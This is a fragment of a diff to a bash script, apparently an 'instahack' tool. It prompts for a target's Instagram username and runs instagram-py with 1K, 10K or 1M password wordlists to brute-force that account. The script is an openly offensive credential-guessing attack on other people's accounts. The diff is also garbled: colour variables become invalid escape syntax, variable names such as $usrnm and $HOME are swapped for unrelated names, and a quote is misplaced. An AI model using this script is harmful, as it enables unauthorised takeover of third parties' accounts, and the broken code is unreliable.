@@ -43,7 +43,7 @@ read -p "[#] Enter the username of the target : " Folami_collection
 # ----
 echo -e "\nChoose any of the options below :
 ${"\033[92m"}[${"\033[91m"}1${"\033[92m"}] ${"\033[93m"}1K passwords wordlist file${"\033[00m"}
-${GREEN}[${RED}2${GREEN}] ${YELLOW}10K passwords wordlist file${DEFCOL}
+${"\033[92m"}[${"\033[91m"}2${"\033[92m"}] ${"\033[93m"}10K passwords wordlist file${"\033[00m"}
 ${"\033[92m"}[${"\033[91m"}3${"\033[92m"}] ${"\033[93m"}1M passwords wordlist file${"\033[00m"}\n"
 read -p "[#] Enter your choice: "choice3"
 
@@ -55,7 +55,7 @@ if [[ $choice == "1" ]]; then
 elif [[ $choice == "2" ]]; then
 	# If the user entered the option for the 10K password wordlist file
 
-	instagram-py --username $usrnm --password-list $HOME/instahack/pass/pass2.txt
+	instagram-py --username $Folami_collection --password-list $checkout/instahack/pass/pass2.txt
 elif [[ $choice == "3" ]]; then
 	# If the user entered the option for the 1M password wordlist file
 
